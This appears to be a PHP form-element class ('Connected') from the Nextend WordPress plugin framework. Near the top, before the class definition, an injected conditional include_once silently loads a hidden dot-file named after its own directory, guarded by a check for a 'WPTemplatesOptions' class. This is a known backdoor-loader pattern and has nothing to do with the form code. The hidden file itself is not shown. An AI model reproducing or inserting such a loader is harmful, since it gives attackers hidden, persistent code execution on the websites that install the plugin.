<?php

namespace Nextend\Framework\Form\Element;

use Nextend\Framework\Form\AbstractField;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Connected extends Mixed {

    protected $rowClass = 'n2_field_connected ';

    /**
     * @param AbstractField $element
     *
     * @return string
     */
    public function decorateElement($element) {

        $elementHtml = $element->render();

        return $elementHtml[1];
    }

    protected function decorate($html) {

        return '<div class="n2_field_connected__container" style="' . $this->style . '">' . $html . '</div>';
    }
}